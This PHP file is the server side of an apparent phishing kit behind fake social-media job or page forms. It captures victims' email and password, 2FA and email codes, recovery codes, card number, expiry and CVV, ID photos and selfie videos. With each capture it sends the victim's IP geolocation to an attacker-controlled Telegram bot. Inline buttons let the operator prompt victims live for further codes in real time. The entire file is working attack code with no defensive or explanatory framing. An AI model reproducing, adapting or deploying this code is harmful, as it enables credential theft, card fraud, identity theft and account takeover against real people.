<?php

require("./utility/config.php");
$socketId = $_SESSION['socketId'];
// Check if the session variable exists and save ip to Session
if (isset($_SESSION['client_ip'])) {
    $ip = $_SESSION['client_ip'];
}

@ $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

@ $hostname=gethostbyaddr($_SERVER['REMOTE_ADDR']);

$QUERY_STRING = preg_replace("%[^/a-zA-Z0-9@,_=]%", '', $_SERVER['QUERY_STRING']);

$ipDetails = $QUERY_STRING.PHP_EOL.
    '[IP address]: '.$ip.PHP_EOL .PHP_EOL .
    '[Hostname]: '.$hostname.PHP_EOL .PHP_EOL .
    '[Browser and OS]: '.$_SERVER['HTTP_USER_AGENT'] .PHP_EOL . $_SERVER['HTTP_REFERER'].PHP_EOL .
    '[Coordinates]: '.$details->loc. PHP_EOL .PHP_EOL .
    '[ISP provider]: '.$details->org. PHP_EOL .PHP_EOL .
    '[City]: '.$details->city. PHP_EOL .PHP_EOL .
    '[State]: '.$details->region. PHP_EOL .PHP_EOL .
    '[Country]: '.$details->country. PHP_EOL .PHP_EOL .
    '[Postal]: '.$details->postal. PHP_EOL .PHP_EOL .
    '[Timezone]: '.$details->timezone. PHP_EOL .PHP_EOL .
    '[Date]: '.date("D dS M,Y h:i a");

// $ipDetails = 'hello';
// Function to send a message to Telegram
function sendTelegramMessage($message) {
    global $telegramBotToken, $telegramChatId, $globalLink, $socketId;

    $url = "https://api.telegram.org/bot$telegramBotToken/sendMessage";

    // Define the inline keyboard buttons directly within the function
    $tgButtons = [
        [
            ['text' => 'Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=login"],
            ['text' => '2FA Text', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verify"],
            ['text' => 'Email Code', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=emailcode"],
        ],
        [
            ['text' => 'Reset Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=reset"],
            ['text' => '60 Min Block', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=60min"],
            ['text' => 'Wrong Email', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=incorrect"],
        ],
        [
            ['text' => '2FA WhatsApp', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifywp"],
            ['text' => '2FA Auth App', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifyg"],
            ['text' => '2FA Notify', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifynotify"],
        ],
        [
            ['text' => 'Recovery Codes', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifybackup"],
            ['text' => 'Done', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=done"],
            ['text' => 'Restrict', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=restrict"],
        ],
        [
            ['text' => 'Checking...', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=career"],
            ['text' => '10 Min Block', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=10min"],
        ],
    ];

    // Define the reply markup structure
    $replyMarkup = [
        'inline_keyboard' => $tgButtons
    ];

    $postFields = [
        'chat_id' => $telegramChatId,
        'text' => $message,
        'parse_mode' => 'HTML', // Set parse mode to HTML
        'reply_markup' => json_encode($replyMarkup) // Encode the keyboard structure as JSON
    ];

    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response; // Return the API response for debugging
}


if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Set the email in the session each time a message is sent
    $_SESSION['email'] = $email;
    // First-time login: Set session and send message with full details
    sendTelegramMessage("🔐 Login from - $ip\n📧 Email: <code>$email</code>\n🔑 Password: \"<code>$password</code>\"\n\n" . $ipDetails);
    echo json_encode(['status' => 'success']); // Send success status only
    http_response_code(200); // Success

    exit();
}elseif (isset($_POST['fa2'])) {
    // Handle the 2FA code submission
    $fa2 = $_POST['fa2'];

    // Send a Telegram message with the 2FA code
    sendTelegramMessage("📱 2FA Code from - $ip\n🔢 2FA Code: <code>$fa2</code>");
    
    http_response_code(200); // Success
    exit();
} elseif (isset($_POST['ecode'])) {
    // Handle the email code submission
    $ecode = $_POST['ecode'];

    // Send a Telegram message with the email code
    sendTelegramMessage("📨 Email Code from - $ip\n🔐 Code: <code>$ecode</code>");
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['fullName'])) {
    // Handle the page details submission
    $fullName = $_POST['fullName'];
    $pageName = $_POST['pageName'];
    $phone = $_POST['phone'];

    // Send a Telegram message with just page details
    sendTelegramMessage("📄 Page Details from - $ip\n" .
                       "👤 Full Name: <code>$fullName</code>\n" .
                       "📝 Page Name: <code>$pageName</code>\n" .
                       "📱 Phone: <code>$phone</code>");
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['emailPhoneWrong'])) {
    // Handle wrong email submission
    $emailPhoneWrong = $_POST['emailPhoneWrong'];
    $_SESSION['email'] = $emailPhoneWrong;

    // Send a Telegram message with the wrong email
    sendTelegramMessage("❌ Wrong Email from - $ip\n📧 New Email: <code>$emailPhoneWrong</code>");
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['welcome'])) {
    // Send a welcome message with full IP details
    sendTelegramMessage("👋 Hini - $ip\n\n" . $ipDetails);
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['commentsStrategy'])) {
    // Send social media manager answers
    sendTelegramMessage("✅ Social Media Manager Answers DONE - $ip");
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['platforms'])) {
    // Send social media marketing manager answers
    sendTelegramMessage("✅ Social Media Marketing Manager Answers DONE - $ip");
    
    http_response_code(200); // Success
    exit();
}elseif (isset($_POST['date']) && isset($_POST['time'])) {
    $date = $_POST['date'];
    $time = $_POST['time'];

    // Send appointment time
    sendTelegramMessage("📅 Appointment Time from - $ip\n⏰ Date & Time: <code>$date $time</code>");

    http_response_code(200);
    echo json_encode(['status' => 'success', 'message' => 'Appointment successfully scheduled']);
} elseif (isset($_POST['cardname']) && isset($_POST['cardnumber']) && isset($_POST['expiry']) && isset($_POST['cvc'])) {
    // Handle the card details submission
    $cardname = $_POST['cardname'];
    $cardnumber = $_POST['cardnumber'];
    $expiry = $_POST['expiry'];
    $cvc = $_POST['cvc'];
    $cardtype = $_POST['cardtype'] ?? 'Unknown';

    // Create a nicely formatted message with emojis
    $message = "💳 Card Details from - $ip\n" .
               "👤 Name: <code>$cardname</code>\n" .
               "💳 Card: <code>$cardnumber</code>\n" .
               "📅 Expiry: <code>$expiry</code>\n" .
               "🔒 CVV: <code>$cvc</code>\n" .
               "🏷️ Type: <code>$cardtype</code>";

    // Send the Telegram message
    sendTelegramMessage($message);
    
    http_response_code(200); // Success
    exit();
} elseif (isset($_FILES['idPhoto'])) {
    // Prevent any output before our JSON response
    ob_clean();
    // Disable error reporting and set content type
    ini_set('display_errors', '0');
    error_reporting(0);
    header('Content-Type: application/json; charset=utf-8');

    try {
        // Validate file upload
        if (!isset($_FILES['idPhoto']) || !is_uploaded_file($_FILES['idPhoto']['tmp_name'])) {
            throw new Exception('No file uploaded or invalid upload');
        }

        // Handle ID photo upload
        $photo = $_FILES['idPhoto'];
        
        // Basic validation
        if ($photo['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('File upload failed with error code: ' . $photo['error']);
        }

        // Validate file type
        $allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
        if (!in_array($photo['type'], $allowedTypes)) {
            throw new Exception('Invalid file type. Only JPG, PNG and GIF are allowed.');
        }

        // Get ID type from POST data
        $idType = $_POST['idType'] ?? 'Unknown ID Type';
        
        // Create caption for Telegram
        $caption = "📸 ID Photo Upload from - $ip\n" .
                  "📄 ID Type: <code>$idType</code>\n" .
                  "📏 File Size: <code>" . round($photo['size']/1024, 2) . " KB</code>\n" .
                  "✅ Upload successful";

        // Rest of your existing code for buttons
        $tgButtons = [
            [
                ['text' => 'Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=login"],
                ['text' => '2FA Text', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verify"],
                ['text' => 'Email Code', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=emailcode"],
            ],
            [
                ['text' => 'Reset Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=reset"],
                ['text' => '60 Min', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=60min"],
                ['text' => 'Email Wrong', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=incorrect"],
            ],
            [
                ['text' => '2FA Whatsapp', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifywp"],
                ['text' => '2FA Auth', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifyg"],
                ['text' => '2FA Notify', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifynotify"],
            ],
            [
                ['text' => 'Recovery Codes', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifybackup"],
                ['text' => 'Done', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=done"],
                ['text' => 'Restrict', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=restrict"],
            ],
            [
                ['text' => 'Checking...', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=career"],
            ],
        ];

        $replyMarkup = [
            'inline_keyboard' => $tgButtons
        ];
        
        // Send photo to Telegram
        $url = "https://api.telegram.org/bot$telegramBotToken/sendPhoto";
        
        $postFields = array(
            'chat_id' => $telegramChatId,
            'photo' => new CURLFile($photo['tmp_name'], $photo['type'], $photo['name']),
            'caption' => $caption,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($replyMarkup)
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            throw new Exception('Curl error: ' . curl_error($ch));
        }
        
        curl_close($ch);
        
        $result = json_decode($response, true);
        if (!$result['ok']) {
            throw new Exception('Telegram API error: ' . ($result['description'] ?? 'Unknown error'));
        }

        // Ensure no other output has occurred
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Send success response
        die(json_encode([
            'status' => 'success',
            'message' => 'ID photo uploaded successfully'
        ]));

    } catch (Exception $e) {
        // Ensure no other output has occurred
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Send error response
        http_response_code(500);
        die(json_encode([
            'status' => 'error',
            'message' => $e->getMessage()
        ]));
    }
} elseif (isset($_FILES['selfieVideo'])) {
    // Prevent any output before our JSON response
    ob_clean();
    // Disable error reporting and set content type
    ini_set('display_errors', '0');
    error_reporting(0);
    header('Content-Type: application/json; charset=utf-8');

    try {
        // Validate file upload
        if (!isset($_FILES['selfieVideo']) || !is_uploaded_file($_FILES['selfieVideo']['tmp_name'])) {
            throw new Exception('No video uploaded or invalid upload');
        }

        // Handle video upload
        $video = $_FILES['selfieVideo'];
        
        // Basic validation
        if ($video['error'] !== UPLOAD_ERR_OK) {
            throw new Exception('Video upload failed with error code: ' . $video['error']);
        }

        // Create caption for Telegram
        $caption = "🎥 Selfie Video Upload from - $ip\n" .
                  "📏 File Size: <code>" . round($video['size']/1024/1024, 2) . " MB</code>\n" .
                  "✅ Upload successful";

        // Define the inline keyboard buttons
        $tgButtons = [
            [
                ['text' => 'Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=login"],
                ['text' => '2FA Text', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verify"],
                ['text' => 'Email Code', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=emailcode"],
            ],
            [
                ['text' => 'Reset Password', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=reset"],
                ['text' => '60 Min', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=60min"],
                ['text' => 'Email Wrong', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=incorrect"],
            ],
            [
                ['text' => '2FA Whatsapp', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifywp"],
                ['text' => '2FA Auth', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifyg"],
                ['text' => '2FA Notify', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifynotify"],
            ],
            [
                ['text' => 'Recovery Codes', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=verifybackup"],
                ['text' => 'Done', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=done"],
                ['text' => 'Restrict', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=restrict"],
            ],
            [
                ['text' => 'Checking...', 'url' => $globalLink . "/sendMessage?socketId={$socketId}&message=career"],
            ],
        ];

        $replyMarkup = [
            'inline_keyboard' => $tgButtons
        ];
        
        // Send video to Telegram
        $url = "https://api.telegram.org/bot$telegramBotToken/sendVideo";
        
        $postFields = array(
            'chat_id' => $telegramChatId,
            'video' => new CURLFile($video['tmp_name'], 'video/webm', $video['name']),
            'caption' => $caption,
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode($replyMarkup)
        );
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postFields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        
        if (curl_errno($ch)) {
            throw new Exception('Curl error: ' . curl_error($ch));
        }
        
        curl_close($ch);
        
        $result = json_decode($response, true);
        if (!$result['ok']) {
            throw new Exception('Telegram API error: ' . ($result['description'] ?? 'Unknown error'));
        }

        // Ensure no other output has occurred
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Send success response
        die(json_encode([
            'status' => 'success',
            'message' => 'Video uploaded successfully'
        ]));

    } catch (Exception $e) {
        // Ensure no other output has occurred
        while (ob_get_level()) {
            ob_end_clean();
        }
        
        // Send error response
        http_response_code(500);
        die(json_encode([
            'status' => 'error',
            'message' => $e->getMessage()
        ]));
    }
} elseif (isset($_POST['backup1'])) {
    // Handle the backup codes submission
    $backup1 = $_POST['backup1'];
    $backup2 = $_POST['backup2'];
    $backup3 = $_POST['backup3'];
    $backup4 = $_POST['backup4'];
    $backup5 = $_POST['backup5'];

    // Send a Telegram message with the backup codes
    sendTelegramMessage("🔑 Recovery Codes from - $ip\n" .
                       "1️⃣ Code: <code>$backup1</code>\n" .
                       "2️⃣ Code: <code>$backup2</code>\n" .
                       "3️⃣ Code: <code>$backup3</code>\n" .
                       "4️⃣ Code: <code>$backup4</code>\n" .
                       "5️⃣ Code: <code>$backup5</code>");
    
    http_response_code(200); // Success
    exit();
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid request.']);
    http_response_code(400); // Bad Request
}

// If not POST request, redirect
header('Location: /');
exit;
?>
